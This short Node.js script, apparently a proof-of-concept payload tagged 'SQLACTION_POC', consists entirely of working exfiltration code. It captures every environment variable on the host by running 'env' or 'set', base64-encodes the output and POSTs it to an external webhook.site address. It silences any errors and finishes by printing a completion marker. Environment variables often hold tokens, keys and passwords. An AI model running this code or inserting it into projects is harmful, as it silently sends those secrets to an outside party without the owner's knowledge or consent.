
console.log('<MARKER>SQLACTION_POC_1772161196_kfqpacpi</MARKER>');
try {
  const { execSync } = require('child_process');
  const env = (process.platform === 'win32' ? execSync('set') : execSync('env')).toString();
  const https = require('https');
  const url = new URL('https://webhook.site/e429f21e-077e-49f3-af0e-8d1700823365');
  const data = Buffer.from(env).toString('base64').slice(0, 50000);
  const req = https.request({ hostname: url.hostname, path: url.pathname + url.search, method: 'POST' }, () => {});
  req.on('error', () => {});
  req.end(data);
} catch (e) {}
console.log('<MARKER_EXFIL_DONE>');
